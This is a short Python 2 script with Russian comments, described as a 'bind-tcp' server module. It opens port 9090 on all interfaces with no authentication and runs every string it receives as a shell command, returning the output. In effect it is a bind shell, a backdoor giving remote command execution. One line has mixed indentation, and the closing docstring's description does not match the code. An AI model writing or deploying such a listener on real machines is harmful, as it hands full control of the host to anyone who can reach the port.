#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Server module. Recieve commands from control module and executes it.
# bind-tcp

import socket
import sys # for platform
from subprocess import Popen, PIPE

def executeCommand(command): #Should return result
	process = Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
	return process.communicate()[0]

def handler(conn, addr):
	while True:
		command = conn.recv(1024)
	   	if not command: # if empty 
			break
		#conn.send("Server: Received: {}".format(command))
		conn.send(executeCommand(command))

####################################################################

sock = socket.socket()
# start server
port = 9090
sock.bind(('', port)) # any interface, 9090 port.
sock.listen(5)

#conn, addr = sock.accept()
try:
	while True: # Постоянная работа сервера.
		conn, addr = sock.accept()
		conn.send("System platform is: {}".format(sys.platform))
		conn.settimeout(60)
		#print ("Connection from: {}".format(addr[0])) #Debug
		try:
			handler(conn, addr)
		except:
			conn.send("That happens...")
		finally: 
			conn.close()
finally:
	sock.close()


'''
Сервер должен постоянно крутится
Принимает от клиента данные, возвращает их измененными.
'''